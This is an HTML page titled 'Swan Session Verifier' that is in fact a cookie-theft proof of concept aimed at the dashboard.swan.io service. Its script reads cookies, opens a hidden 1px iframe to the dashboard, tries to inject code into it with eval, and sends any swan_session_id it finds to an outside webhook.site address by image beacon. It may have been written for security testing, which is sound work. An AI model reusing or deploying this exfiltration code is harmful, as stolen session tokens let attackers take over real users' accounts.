<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Swan Session Verifier</title>
    <style>
        body { font-family: system-ui, sans-serif; margin: 20px; }
        .box { border: 1px solid #ddd; padding: 20px; margin: 20px 0; border-radius: 5px; }
        pre { background: #f5f5f5; padding: 10px; overflow: auto; }
        .success { color: green; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Swan Session Verifier</h2>
        <p>Checking for swan_session_id cookie...</p>
        <button id="checkButton">Extract Cookie & Send to Webhook</button>
    </div>
    
    <div class="box">
        <h3>Extraction Log:</h3>
        <pre id="log">Ready to extract...</pre>
    </div>
    
    <script>
        // Your webhook URL
        const WEBHOOK_URL = "https://webhook.site/9ef1fe5e-6b72-4a68-b1bd-5ca39d09311a";
        
        // Logging function
        function log(message) {
            const logElement = document.getElementById('log');
            const timestamp = new Date().toLocaleTimeString();
            logElement.textContent += `[${timestamp}] ${message}\n`;
            console.log(`[${timestamp}] ${message}`);
        }
        
        // Send data to webhook using image beacon (most reliable for cross-origin)
        function sendToWebhook(cookieName, cookieValue, source) {
            log(`Sending ${cookieName} to webhook...`);
            
            // Create image beacon (very reliable method)
            const img = new Image();
            img.onload = () => log("Data sent successfully");
            img.onerror = () => log("Data sent (ignore error)");
            img.src = `${WEBHOOK_URL}?cookie_name=${encodeURIComponent(cookieName)}&cookie_value=${encodeURIComponent(cookieValue)}&source=${encodeURIComponent(source)}&time=${Date.now()}`;
            
            return true;
        }
        
        // Simple extraction approach
        function extractCookie() {
            log("Starting cookie extraction...");
            
            // Method 1: Check if cookie already exists in this document
            const allCookies = document.cookie;
            log(`Current cookies: ${allCookies}`);
            
            // Parse cookies and look for swan_session_id
            if (allCookies.includes('swan_session_id')) {
                const match = allCookies.match(/swan_session_id=([^;]+)/);
                if (match) {
                    log(`Found swan_session_id directly: ${match[1].substring(0, 5)}...`);
                    sendToWebhook('swan_session_id', match[1], 'direct_access');
                    return true;
                }
            }
            
            // Method 2: Create iframe to dashboard
            log("Creating iframe to dashboard.swan.io...");
            const iframe = document.createElement('iframe');
            iframe.src = "https://dashboard.swan.io/";
            iframe.style.width = "1px";
            iframe.style.height = "1px";
            iframe.style.opacity = "0.01";
            document.body.appendChild(iframe);
            
            // Set up message listener for potential communication
            window.addEventListener('message', (event) => {
                log(`Received message from iframe: ${JSON.stringify(event.data)}`);
                
                if (event.data && event.data.swanSessionId) {
                    log(`Got swan_session_id from iframe message!`);
                    sendToWebhook('swan_session_id', event.data.swanSessionId, 'iframe_message');
                }
            });
            
            // When iframe loads, try to extract the cookie
            iframe.onload = () => {
                log("Dashboard iframe loaded, attempting extraction...");
                
                try {
                    // Try to directly access iframe document (will likely fail due to Same-Origin Policy)
                    const iframeCookies = iframe.contentDocument.cookie;
                    log(`Iframe cookies: ${iframeCookies}`);
                    
                    // Check for swan_session_id
                    if (iframeCookies.includes('swan_session_id')) {
                        const match = iframeCookies.match(/swan_session_id=([^;]+)/);
                        if (match) {
                            log(`Found swan_session_id in iframe: ${match[1].substring(0, 5)}...`);
                            sendToWebhook('swan_session_id', match[1], 'iframe_direct');
                            return true;
                        }
                    }
                } catch (e) {
                    log(`Expected error accessing iframe (Same-Origin Policy): ${e.message}`);
                    
                    // Try to inject a content script (will also likely fail)
                    try {
                        iframe.contentWindow.eval(`
                            try {
                                const cookies = document.cookie;
                                if (cookies.includes('swan_session_id')) {
                                    const match = cookies.match(/swan_session_id=([^;]+)/);
                                    if (match) {
                                        // Send to parent window
                                        window.parent.postMessage({
                                            swanSessionId: match[1]
                                        }, "*");
                                        
                                        // Also send directly via image beacon
                                        const img = new Image();
                                        img.src = "${WEBHOOK_URL}?cookie_name=swan_session_id&cookie_value=" + 
                                            encodeURIComponent(match[1]) + "&source=iframe_eval&time=" + Date.now();
                                    }
                                }
                            } catch(e) {
                                console.error("Cookie extraction error:", e);
                            }
                        `);
                    } catch (e2) {
                        log(`Expected error injecting script into iframe: ${e2.message}`);
                    }
                }
            };
            
            // Clean up iframe after 5 seconds
            setTimeout(() => {
                document.body.removeChild(iframe);
                log("Removed iframe");
            }, 5000);
            
            return false;
        }
        
        // Attach event listener to button
        document.getElementById('checkButton').addEventListener('click', extractCookie);
        
        // Log when page loads
        window.onload = () => {
            log("Page loaded. Click the button to start extraction.");
        };
    </script>
</body>
</html>
